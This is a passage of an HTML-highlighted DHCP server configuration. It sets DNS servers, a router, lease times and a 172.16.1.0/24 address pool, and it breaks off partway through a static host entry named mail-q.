class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;domain-name-servers&lt;/span&gt; &lt;span class="nt"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;8&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;140&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;113&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;subnet-mask&lt;/span&gt; &lt;span class="nt"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;routers&lt;/span&gt; &lt;span class="nt"&gt;172&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;16&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;254&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;broadcast-address&lt;/span&gt; &lt;span class="nt"&gt;172&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;16&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;default-lease-time&lt;/span&gt; &lt;span class="nt"&gt;3600&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;max-lease-time&lt;/span&gt; &lt;span class="nt"&gt;7200&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;ddns-update-style&lt;/span&gt; &lt;span class="nt"&gt;none&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;log-facility&lt;/span&gt; &lt;span class="nt"&gt;local7&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;pool&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;subnet&lt;/span&gt; &lt;span class="nt"&gt;172&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;16&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;netmask&lt;/span&gt; &lt;span class="nt"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt;range&lt;/span&gt; &lt;span class="err"&gt;172.16.1.101&lt;/span&gt; &lt;span class="err"&gt;172.16.1.200&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;static&lt;/span&gt; &lt;span class="nt"&gt;private&lt;/span&gt; &lt;span class="nt"&gt;ip&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;host&lt;/span&gt; &lt;span class="nt"&gt;mail-q&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt;hardware&lt;/span&gt; &lt;span class="err"&gt;ethernet&lt;/span&gt; &lt;span class="err"&gt;5&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;c3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; 